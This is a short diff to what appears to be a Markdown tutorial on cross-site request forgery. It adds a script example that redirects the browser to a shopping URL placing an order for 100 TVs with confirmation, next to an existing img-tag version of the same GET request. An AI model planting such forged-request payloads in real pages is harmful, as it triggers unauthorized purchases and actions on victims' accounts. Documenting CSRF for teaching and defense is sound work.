@@ -34,6 +34,14 @@ Get Method are easier to resolve and more predectible.
 <img src="http://www.shopping-online.com/Index?buy=tv&nb=100&confirm=1">
 ```
 
+or:
+
+```html
+<script>
+    location = "http://www.shopping-online.com/Index?buy=tv&nb=100&confirm=1";
+</script>
+```
+
 ## Post Method
 
 ```html
